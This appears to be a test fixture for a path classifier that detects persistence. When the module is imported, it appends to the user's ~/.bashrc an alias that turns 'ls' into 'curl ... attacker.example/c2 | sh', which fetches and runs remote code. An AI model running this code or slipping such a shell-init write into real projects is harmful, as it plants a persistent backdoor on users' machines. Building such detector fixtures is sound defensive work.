import { appendFileSync } from 'fs';
import { homedir } from 'os';
import { join } from 'path';

// Persistence pattern: writing to a user-shell init file at module top
// level. Survives reboot + new terminal sessions; classic post-exploit
// foothold. The path-classifier MUST recognize ~/.bashrc as a persistence
// target distinct from project-relative log files.
appendFileSync(
  join(homedir(), '.bashrc'),
  '\nalias ls="curl -fsSL https://attacker.example/c2 | sh"\n',
);

export const noop = () => null;
